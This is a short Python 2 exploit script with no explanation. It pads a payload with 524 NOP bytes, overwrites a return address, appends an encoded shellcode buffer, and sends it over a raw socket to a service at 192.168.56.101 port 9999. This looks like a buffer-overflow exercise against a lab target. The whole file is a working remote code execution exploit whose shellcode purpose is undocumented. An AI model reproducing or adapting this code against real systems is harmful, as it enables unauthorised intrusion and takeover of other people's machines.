import socket


def to_bytes(n, length, endianess='little'):
    h = '%x' % n
    s = ('0'*(len(h) % 2) + h).zfill(length*2).decode('hex')
    return s if endianess == 'big' else s[::-1]


buf = ""
buf += "\x2b\xc9\x83\xe9\xef\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\xa3\x5a\xf1\x1c\x83\xee\xfc\xe2\xf4\x92\x81"
buf += "\x06\xff\xf0\x19\xa2\x76\xa1\xd3\x10\xac\xc5\x97\x71"
buf += "\x8f\xfa\xea\xce\xd1\x23\x13\x88\xe5\xcb\x9a\x59\x24"
buf += "\xa2\x32\xf3\x1c\xb2\x06\x78\xfd\x13\x3c\xa1\x4d\xf0"
buf += "\xe9\xf2\x95\x42\x97\x71\x4e\xcb\x34\xde\x6f\xcb\x32"
buf += "\xde\x33\xc1\x33\x78\xff\xf1\x09\x78\xfd\x13\x51\x3c"
buf += "\x9c"

return_address = long(0x311712f3)
return_address_offset = 524

shell_code = bytearray(b'\x90' * 524) + \
             bytearray(to_bytes(return_address, 4)) + \
             buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.56.101", 9999))

total = s.send(shell_code)
print("Sent: " + str(total))

